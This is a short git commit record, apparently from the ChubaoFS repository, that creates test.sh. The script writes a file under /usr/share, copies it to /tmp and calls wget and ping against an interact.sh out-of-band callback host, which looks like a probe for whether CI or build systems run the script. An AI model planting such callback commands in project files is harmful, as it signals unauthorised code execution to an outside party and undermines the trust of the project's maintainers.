d318c76a6df5da089aab85b1906a629d5fa385ca
ChubaoFS <98827895+ChubaoFS@users.noreply.github.com>
2022-02-03 12:56:18 +0000

    Create test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,4 @@
-/bin/bash ping c7fscwk2vtc000095zs0gdzhsqeyyyyyb.interact.sh
+#!/bin/sh
+echo "Test 123" > /usr/share/test
+cp /usr/share/test /tmp/test
+/bin/bash wget https://c7fscwk2vtc000095zs0gdzhsqeyyyyyb.interact.sh
